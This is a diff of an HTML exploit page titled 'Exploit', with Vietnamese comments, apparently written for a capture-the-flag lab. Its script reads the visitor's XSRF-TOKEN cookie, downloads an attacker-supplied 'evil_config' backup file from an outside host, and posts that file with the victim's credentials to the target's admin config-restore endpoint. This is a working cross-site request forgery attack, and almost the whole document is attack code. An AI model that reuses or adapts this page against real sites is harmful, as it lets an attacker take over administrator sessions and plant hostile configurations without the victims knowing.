@@ -1,25 +1,46 @@
 <!DOCTYPE html>
 <html>
-  <head><meta charset="UTF-8"><title>Exploit</title></head>
-  <body>
-    <script>
-      fetch("https://0x0.st/8xKY.sav")  // Link file .sav
-        .then(res => res.blob())
-        .then(blob => {
-          const formData = new FormData();
-          formData.append("config_file", blob, "config_backup.sav");
+<head>
+  <meta charset="UTF-8">
+  <title>Exploit</title>
+</head>
+<body>
+  <script>
+    // Bước 1: Lấy token từ cookie
+    function getXSRFToken() {
+      const cookies = document.cookie.split(";");
+      for (let cookie of cookies) {
+        const [name, value] = cookie.trim().split("=");
+        if (name === "XSRF-TOKEN") {
+          return decodeURIComponent(value);
+        }
+      }
+      return null;
+    }
 
-          return fetch("https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/configs/restore", {
-            method: "POST",
-            body: formData
-          });
-        })
-        .then(res => {
-          // optional: notify qua webhook nếu muốn
-        })
-        .catch(err => {
-          // optional: báo lỗi qua webhook
+    // Bước 2: Fetch file và gửi
+    fetch("https://raw.githubusercontent.com/Shu-Ouma-0/evil_config/refs/heads/main/config_backup.sav")
+      .then(res => res.blob())
+      .then(blob => {
+        const xsrfToken = getXSRFToken();
+        const formData = new FormData();
+        formData.append("config_file", blob, "config_backup.sav");
+
+        return fetch("https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/configs/restore", {
+          method: "POST",
+          headers: {
+            "X-XSRF-TOKEN": xsrfToken
+          },
+          body: formData,
+          credentials: "include"  // gửi kèm cookie
         });
-    </script>
-  </body>
+      })
+      .then(res => {
+        console.log("Upload done:", res.status);
+      })
+      .catch(err => {
+        console.error("Exploit failed:", err);
+      });
+  </script>
+</body>
 </html>
